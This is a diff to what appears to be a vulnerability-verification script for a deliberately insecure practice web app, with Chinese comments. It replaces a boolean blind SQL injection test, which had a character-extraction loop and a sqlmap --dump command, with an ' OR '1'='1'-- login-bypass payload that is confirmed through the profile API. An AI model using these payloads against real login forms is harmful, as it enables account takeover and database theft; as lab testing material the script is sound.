@@ -40,75 +40,50 @@ def login(username, password):
 # ─────────────────────────────────────────────
 # 漏洞8：登录接口 username 字段 —— 布尔盲注
 # ─────────────────────────────────────────────
-def get_response_hint(resp_html):
-    """从响应 HTML 中提取 flash 提示文字"""
-    for keyword in ("账户不存在", "密码错误", "登录成功"):
-        if keyword in resp_html:
-            return keyword
-    return "(无提示)"
-
-
 def test_login_injection():
     print("\n" + "─" * 56)
-    print("  漏洞8：POST /login  username 字段 SQL注入（布尔盲注）")
+    print("  漏洞8：POST /login  username 字段 SQL注入（万能密码绕过）")
     print("─" * 56)
 
-    def post_login(username, password="wrongpassword"):
+    def post_login(username, password="any"):
         r = requests.post(f"{BASE_URL}/login",
                           data={"username": username, "password": password},
-                          allow_redirects=True)
-        return r.text
+                          allow_redirects=False)
+        return r.status_code, r.headers.get("Location", "")
 
-    # 对照组：正常存在的用户 → "密码错误"
-    hint_exist = get_response_hint(post_login("zhangsan"))
-    # 对照组：不存在的用户 → "账户不存在"
-    hint_not_exist = get_response_hint(post_login("no_such_user_xyz"))
+    # 正常登录对照
+    code, loc = post_login("zhangsan", "123456")
+    print(f"{INFO} 正常登录（zhangsan/123456）→ HTTP {code}")
 
-    print(f"{INFO} 正常用户（zhangsan）+ 错误密码 → 提示：「{hint_exist}」")
-    print(f"{INFO} 不存在用户               + 错误密码 → 提示：「{hint_not_exist}」")
+    # 错误密码对照
+    code, loc = post_login("zhangsan", "wrongpass")
+    print(f"{INFO} 错误密码                  → HTTP {code}")
 
-    if hint_exist == hint_not_exist:
-        print(f"{FAIL} 两种情况提示相同，布尔盲注无法区分，注入点设计有问题")
-        return
+    # 万能密码注入：username = ' OR '1'='1'--
+    # SQL 变为：WHERE username = '' OR '1'='1'-- AND password_hash = 'any'
+    # -- 注释掉密码校验，OR '1'='1' 返回第一个用户
+    payload = "' OR '1'='1'--"
+    code, loc = post_login(payload, "随便填")
+    print(f"\n{WARN} 万能密码注入 username={repr(payload)}")
+    print(f"     password=随便填  → HTTP {code} {'✓ 登录成功(302跳转)' if code == 302 else '✗'}")
 
-    print(f"\n{OK} 两种提示不同，构成布尔 oracle，可进行盲注：")
-    print(f"    「{hint_exist}」   → 查询有返回行（条件为真）")
-    print(f"    「{hint_not_exist}」 → 查询无返回行（条件为假）")
+    if code == 302:
+        # 跟随跳转验证登录了哪个用户
+        s = requests.Session()
+        s.post(f"{BASE_URL}/login",
+               data={"username": payload, "password": "随便填"},
+               allow_redirects=False)
+        r = s.get(f"{BASE_URL}/api/profile")
+        try:
+            name = r.json()["data"]["username"]
+            print(f"     实际登录用户：{name}")
+        except Exception:
+            pass
+        print(f"{OK} 漏洞验证成功：用户名注入绕过密码校验，以任意密码登录")
 
-    # 布尔验证：AND 1=1（真） vs AND 1=2（假）
-    # payload 注入后 SQL：WHERE username = 'zhangsan' AND '1'='1'
-    hint_true  = get_response_hint(post_login("zhangsan' AND '1'='1"))
-    hint_false = get_response_hint(post_login("zhangsan' AND '1'='2"))
-    print(f"\n{INFO} 注入 AND '1'='1 → 提示：「{hint_true}」")
-    print(f"{INFO} 注入 AND '1'='2 → 提示：「{hint_false}」")
-
-    if hint_true == hint_exist and hint_false == hint_not_exist:
-        print(f"{OK} 漏洞验证成功：布尔条件控制查询是否返回行，注入点有效")
-    else:
-        print(f"    提示不符合预期，请检查数据库数据")
-
-    # 演示字符提取：盲注读取第一个用户名的第一个字母
-    # SQL：WHERE username = '' OR (SELECT substr(username,1,1) FROM users LIMIT 1) = 'z'--
-    print(f"\n{INFO} 演示字符提取（盲注读取 users 表第一行 username 首字母）：")
-    found_char = None
-    for c in "abcdefghijklmnopqrstuvwxyz":
-        pl = f"' OR (SELECT substr(username,1,1) FROM users LIMIT 1)='{c}'--"
-        hint = get_response_hint(post_login(pl))
-        if hint == hint_exist:
-            found_char = c
-            break
-    if found_char:
-        print(f"{WARN} 第一个用户 username 首字母为：'{found_char}'")
-        print(f"{OK} 字符提取成功，可逐字符枚举全部数据")
-    else:
-        print(f"    未匹配到字母，检查 payload 格式")
-
-    print(f"\n  sqlmap 扫描命令（POST 表单，布尔盲注）：")
-    print(f'  sqlmap -u "{BASE_URL}/login" \\')
-    print(f'    --data="username=zhangsan&password=test" \\')
-    print(f'    -p username --dbms=sqlite \\')
-    print(f'    --string="密码错误" \\')
-    print(f'    --technique=B --level=2 --dump')
+    print(f"\n  注入后执行的 SQL：")
+    print(f"  SELECT id FROM users WHERE username = '{payload}' AND password_hash = '随便填'")
+    print(f"  等价于：SELECT id FROM users WHERE '' OR '1'='1'")
 
 
 # ─────────────────────────────────────────────
